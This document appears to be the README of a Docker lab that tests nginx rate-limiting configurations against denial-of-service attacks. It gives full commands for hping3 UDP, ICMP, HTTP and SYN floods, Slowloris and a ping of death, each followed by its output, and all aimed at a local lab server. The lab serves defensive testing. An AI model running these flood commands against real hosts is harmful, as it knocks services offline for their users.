# DDosBlock 

## Prepare
Change nginx conf file in docker-compose.yml and see DDos attacks and nginx blocks results:  
From: nginx_0.conf 
To:  
    - nginx_1.conf - limit request per second from one IP 
    - nginx_2.conf - limit sessions quantity from one IP 
    - nginx_3.conf - limit swnd data time 
    - nginx_4.conf - limit upstream connections 

## Run
Run every time for rebuild and restart containers
```
docker-compose down
docker-compose build
docker-compose up
```

## UDP Flood 
`
hping3 --udp -i u100  www.condelnet.com -p 80
`

Result:
```
ICMP Port Unreachable from ip=192.168.56.4 name=ddosblock_nginx_1.ddosblock_ddos
status=0 port=63120 seq=127209
ICMP Port Unreachable from ip=192.168.56.4 name=ddosblock_nginx_1.ddosblock_ddos
status=0 port=3611 seq=133236
ICMP Port Unreachable from ip=192.168.56.4 name=ddosblock_nginx_1.ddosblock_ddos
status=0 port=10108 seq=139733
ICMP Port Unreachable from name=ddosblock_nginx_1.ddosblock_ddos
status=0 port=16206 seq=145831
ICMP Port Unreachable from ip=192.168.56.4 name=ddosblock_nginx_1.ddosblock_ddos
status=0 port=22227 seq=151852
--- www.condelnet.com hping statistic ---
152908 packets transmitted, 30 packets received, 100% packet loss
round-trip min/avg/max = 0.9/5.7/8.9 ms
```

## ICMP flood 
`
hping3 -1 -i u100  www.condelnet.com -p 80
`

Result:
```
len=28 ip=192.168.56.4 ttl=64 id=5901 icmp_seq=53451 rtt=5.4 ms
len=28 ip=192.168.56.4 ttl=64 id=5914 icmp_seq=53452 rtt=5.3 ms
len=28 ip=192.168.56.4 ttl=64 id=5929 icmp_seq=53453 rtt=5.2 ms
--- www.condelnet.com hping statistic ---
53554 packets transmitted, 53454 packets received, 1% packet loss
round-trip min/avg/max = 1.6/18.9/1017.3 ms
```

## HTTP flood 
`
hping3 -i u100  www.condelnet.com
`

Result:
```
len=40 ip=192.168.56.4 ttl=64 DF id=0 sport=0 flags=RA seq=88398 win=0 rtt=4.8 ms
len=40 ip=192.168.56.4 ttl=64 DF id=0 sport=0 flags=RA seq=88399 win=0 rtt=4.7 ms
len=40 ip=192.168.56.4 ttl=64 DF id=0 sport=0 flags=RA seq=88400 win=0 rtt=5.0 ms
--- www.condelnet.com hping statistic ---
88464 packets transmitted, 88401 packets received, 1% packet loss
round-trip min/avg/max = 1.2/18.7/1030.9 ms
```

## Slowloris 
```
pip install Slowloris
slowloris localhost -s 250 -ua
```

Result:
```
nginx_1      | 2022/10/27 23:10:53 [warn] 33#33: 50 worker_connections are not enough, reusing connections

nginx_1      | 192.168.56.1 - - [27/Oct/2022:23:13:43 +0000] "GET /?517 HTTP/1.1" 400 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50" "-"
nginx_1      | 192.168.56.1 - - [27/Oct/2022:23:13:43 +0000] "GET /?995 HTTP/1.1" 400 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36" "-"
nginx_1      | 192.168.56.1 - - [27/Oct/2022:23:13:43 +0000] "GET /?1896 HTTP/1.1" 400 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36" "-"
nginx_1      | 192.168.56.1 - - [27/Oct/2022:23:13:43 +0000] "GET /?904 HTTP/1.1" 400 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36" "-"
```



nginx_1.conf
Result:
503 Service Temporarily Unavailable 
nginx/1.21.6 
```
nginx_1  | 192.168.56.1 - - [28/Oct/2022:13:33:23 +0000] "GET / HTTP/1.1" 503 599 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
nginx_1  | 192.168.56.1 - - [28/Oct/2022:13:33:23 +0000] "GET / HTTP/1.1" 503 599 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
nginx_1  | 2022/10/28 13:33:23 [error] 37#37: *251 limiting requests, excess: 0.584 by zone "one", client: 192.168.56.1, server: localhost, request: "GET / HTTP/1.1", host: "localhost"
```



## SYN flood 
`
hping3 -S -q -n -i u100  www.condelnet.com -p 80
`

Result:
```
HPING www.condelnet.com (eth0 192.168.56.4): S set, 40 headers + 0 data bytes
--- www.condelnet.com hping statistic ---
728994 packets transmitted, 728954 packets received, 1% packet loss
round-trip min/avg/max = 0.6/10.4/1014.0 ms
```

## Ping of Death 
`
ping -l 65509 www.condelnet.com
`

Result:
```
ping: cannot set preload to value greater than 3: 65509
```
